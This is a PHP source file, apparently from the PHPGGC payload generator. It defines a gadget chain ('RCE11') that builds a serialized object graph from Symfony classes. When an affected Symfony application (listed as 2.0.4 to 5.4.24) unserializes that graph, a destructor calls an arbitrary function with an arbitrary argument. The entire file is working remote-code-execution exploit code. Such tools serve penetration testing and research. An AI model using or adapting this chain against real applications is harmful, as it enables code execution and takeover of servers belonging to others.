<?php

namespace GadgetChain\Symfony;

class RCE11 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '2.0.4 <= 5.4.24 (all)';
    public static $vector = '__destruct';
    public static $author = 'cfreal';

    public function generate(array $parameters)
    {
        $a = new \Symfony\Component\Validator\ConstraintViolationList([
            $parameters["function"],
            $parameters["parameter"]
        ]);
        $b = new \Symfony\Component\Finder\Iterator\SortableIterator($a, "call_user_func");
        $c = new \Symfony\Component\Validator\ConstraintViolationList($b);
        $d = new \Symfony\Component\Security\Core\Authentication\Token\AnonymousToken($c);
        return $d;
    }
}